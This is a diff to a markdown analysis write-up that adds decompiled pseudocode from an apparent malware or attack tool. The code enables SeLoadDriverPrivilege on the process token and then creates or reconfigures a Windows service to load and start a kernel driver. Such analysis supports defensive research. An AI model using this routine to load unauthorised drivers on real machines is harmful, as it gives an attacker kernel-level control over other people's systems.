@@ -245,6 +245,126 @@ Setup the driver
             v33 = sub_403930(v23, Destination);
 ```
 <br /><br />
+Active SeLoadDriverPrivilege, whihch allowes an account to load system driver (Administrator and Print Operators they have this privilege by default)
+
+```sh
+  v3 = GetProcessHeap();
+  v4 = (struct _TOKEN_PRIVILEGES *)HeapAlloc(v3, 8u, 0x40u);
+  if ( v4 )
+  {
+    v5 = GetCurrentProcess();
+    if ( OpenProcessToken(v5, 0x28u, &TokenHandle) )
+    {
+      LookupPrivilegeValueW(0, L"SeLoadDriverPrivilege", (PLUID)v4->Privileges);
+      v4->PrivilegeCount = 1;
+      v4->Privileges[0].Attributes = 2;
+      hSCManager = (SC_HANDLE)AdjustTokenPrivileges(TokenHandle, 0, v4, 0, 0, 0);
+    }
+    GetLastError();
+    v6 = GetProcessHeap();
+    HeapFree(v6, 0, v4);
+    if ( hSCManager )
+    {
+      if ( lpBinaryPathName )
+      {
+```
+<br /><br />
+Use the privilege to load a driver
+
+```sh
+        v7 = OpenSCManagerW(0, L"ServicesActive", 3u);
+        hSCManager = v7;
+        if ( !v7 )
+        {
+          v8 = GetLastError();
+          SetLastError(v8);
+          return 0;
+        }
+        v10 = OpenServiceW(v7, lpServiceName, 0x16u);
+        if ( v10 )
+        {
+          ServiceStatus.dwWaitHint = 0;
+          *(_OWORD *)&ServiceStatus.dwServiceType = 0i64;
+          *(_QWORD *)&ServiceStatus.dwServiceSpecificExitCode = 0i64;
+          if ( QueryServiceStatus(v10, &ServiceStatus) )
+          {
+            v2 = ServiceStatus.dwCurrentState == 4;
+          }
+          else if ( !ChangeServiceConfigW(v10, 1u, 3u, 1u, lpBinaryPathName, 0, 0, 0, 0, 0, 0) )
+          {
+            v15 = v10;
+            v12 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;
+            v11 = GetLastError();
+            CloseServiceHandle(v15);
+            goto LABEL_13;
+          }
+        }
+        else
+        {
+          v11 = GetLastError();
+          if ( v11 != 1060 )
+          {
+LABEL_12:
+            v12 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;
+LABEL_13:
+            v12(hSCManager);
+            SetLastError(v11);
+            return v2;
+          }
+          v10 = CreateServiceW(
+                  hSCManager,
+                  lpServiceName,
+                  lpServiceName,
+                  0xF01FFu,
+                  1u,
+                  3u,
+                  1u,
+                  lpBinaryPathName,
+                  0,
+                  0,
+                  0,
+                  0,
+                  0);
+          if ( !v10 )
+          {
+            v11 = GetLastError();
+            goto LABEL_12;
+          }
+          v19 = 1;
+        }
+        for ( i = 0; i < 5; ++i )
+        {
+          if ( v2 )
+            break;
+          v2 = StartServiceW(v10, 0, 0);
+          Sleep(0x3E8u);
+        }
+        v11 = 0;
+        if ( !v2 )
+        {
+          v11 = GetLastError();
+          if ( v11 == 1056 )
+          {
+            v14 = v10;
+            v12 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;
+            v2 = 1;
+            CloseServiceHandle(v14);
+            goto LABEL_13;
+          }
+          if ( v19 )
+            DeleteService(v10);
+        }
+        v16 = v10;
+        v12 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;
+        CloseServiceHandle(v16);
+        goto LABEL_13;
+      }
+    }
+  }
+  return 0;
+
+```
+<br /><br />
 Delete the entry from services
 
 ```sh
